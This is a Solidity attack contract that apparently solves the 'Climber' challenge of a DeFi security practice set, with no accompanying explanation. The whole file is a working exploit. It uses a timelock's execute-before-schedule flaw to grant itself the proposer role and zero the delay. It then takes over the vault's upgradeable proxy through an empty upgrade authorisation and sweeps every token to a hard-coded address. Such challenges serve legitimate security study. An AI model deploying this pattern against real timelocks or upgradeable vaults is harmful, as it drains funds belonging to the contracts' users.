// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "./ClimberTimelock.sol";
import "./ClimberVault.sol";

contract ClimberAttacker is UUPSUpgradeable {
    function sweepFunds(address tokenAddress) external {
        IERC20 token = IERC20(tokenAddress);
        require(
            token.transfer(
                0x90F79bf6EB2c4f870365E785982E1f101E93b906,
                token.balanceOf(address(this))
            ),
            "Transfer failed"
        );
    }

    function attack(
        ClimberTimelock timelock,
        ClimberVault vault,
        address token
    ) external {
        address[] memory targets = new address[](5);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(this);
        targets[3] = address(vault);
        targets[4] = address(vault);
        uint256[] memory values = new uint256[](5);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;
        values[4] = 0;
        bytes[] memory data = new bytes[](5);
        data[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            timelock.PROPOSER_ROLE(),
            address(this)
        );
        data[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        data[2] = abi.encodeWithSignature(
            "propose(address,address,address)",
            address(timelock),
            address(vault),
            token
        );
        data[3] = abi.encodeWithSignature("upgradeTo(address)", address(this));
        data[4] = abi.encodeWithSignature("sweepFunds(address)", token);

        timelock.execute(targets, values, data, 0);
    }

    function propose(
        ClimberTimelock timelock,
        ClimberVault vault,
        address token
    ) external {
        address[] memory targets = new address[](5);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(this);
        targets[3] = address(vault);
        targets[4] = address(vault);
        uint256[] memory values = new uint256[](5);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;
        values[4] = 0;
        bytes[] memory data = new bytes[](5);
        data[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            timelock.PROPOSER_ROLE(),
            address(this)
        );
        data[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        data[2] = abi.encodeWithSignature(
            "propose(address,address,address)",
            address(timelock),
            address(vault),
            token
        );
        data[3] = abi.encodeWithSignature("upgradeTo(address)", address(this));
        data[4] = abi.encodeWithSignature("sweepFunds(address)", token);

        timelock.schedule(targets, values, data, 0);
    }

    function _authorizeUpgrade(
        address newImplementation
    ) internal virtual override {}
}
